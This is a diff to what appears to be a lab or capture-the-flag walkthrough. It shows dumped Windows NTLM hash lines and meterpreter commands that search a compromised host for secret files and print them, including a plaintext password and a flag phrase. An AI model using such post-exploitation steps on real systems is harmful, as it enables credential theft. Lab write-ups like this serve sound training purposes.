@@ -194,4 +194,34 @@ erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715::
 ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:3ed6bd43dee8715e7f7b34043a856a0f:::
 ```
 
+<img width="877" height="412" alt="image" src="https://github.com/user-attachments/assets/68b15e9d-22a2-410c-bd78-e688622419f4" />
 
+```
+meterpreter > search -f secrets.txt
+Found 1 result...
+=================
+
+Path                                                            Size (bytes)  Modified (UTC)
+----                                                            ------------  --------------
+c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 03:44:27 -0400
+```
+
+```
+meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
+My Twitter password is KDSvbsw3849!
+```
+
+```
+meterpreter > search -f realsecret.txt
+Found 1 result...
+=================
+
+Path                               Size (bytes)  Modified (UTC)
+----                               ------------  --------------
+c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 04:30:24 -0400
+```
+
+```
+meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
+The Flash is the fastest man alive
+```
